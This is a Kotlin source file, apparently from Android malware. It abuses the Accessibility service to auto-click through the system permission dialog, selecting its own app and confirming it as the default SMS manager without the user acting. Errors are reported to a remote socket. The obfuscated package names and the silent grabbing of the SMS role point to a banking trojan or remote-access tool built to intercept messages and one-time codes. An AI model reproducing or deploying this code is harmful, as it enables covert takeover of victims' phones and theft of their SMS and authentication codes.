package com.xxx.zzz.accessppp.utilss

import android.view.accessibility.AccessibilityNodeInfo
import com.xxx.zzz.globp.SharedPreferencess
import com.xxx.zzz.globp.utilssss.Utilslp
import com.xxx.zzz.socketsp.IOSocketyt

object AccessUtilsr {
    fun autoclick_change_smsManager_sdk_Q(
        nodeInfo: AccessibilityNodeInfo,
        packName: String?
    ): Boolean {
        runCatching {
            if (packName!!.contains("com.android.permissioncontroller")) {
                val nodeClass = findNodeWithClass(nodeInfo, "android.widget.LinearLayout")
                var click = false
                for (accessibilityNodeInfo in nodeClass) {
                    for (i in 0 until accessibilityNodeInfo.childCount) {
                        val child = accessibilityNodeInfo.getChild(i)
                        if (child.text != null) {
                            if (child.text.toString() == SharedPreferencess.appName || child.text.toString() == Utilslp.getLabelApplication(SharedPreferencess.getAppContext()!!)) {
                                accessibilityNodeInfo.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                                click = true
                            }
                        }
                    }
                }
                if (click) {
                    for (node in nodeInfo.findAccessibilityNodeInfosByViewId("android:id/button1")) {
                        node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                        return true
                    }
                }
            }
        }.onFailure {
            IOSocketyt.sendLogs("", "autoclick_change_smsManager_sdk_Q ${it.localizedMessage}", "error")
        }
        return false
    }

    private fun findNodeWithClass(
        accessibilityNodeInfo: AccessibilityNodeInfo?,
        str: String
    ): List<AccessibilityNodeInfo> {
        val arrayList: ArrayList<AccessibilityNodeInfo> = ArrayList<AccessibilityNodeInfo>()
        if (accessibilityNodeInfo == null) {
            return arrayList
        }
        val childCount = accessibilityNodeInfo.childCount
        for (i in 0 until childCount) {
            val child = accessibilityNodeInfo.getChild(i)
            if (child != null) {
                if (child.className.toString().lowercase()
                        .contains(str.lowercase())
                ) {
                    arrayList.add(child)
                } else {
                    arrayList.addAll(findNodeWithClass(child, str))
                }
            }
        }
        return arrayList
    }
}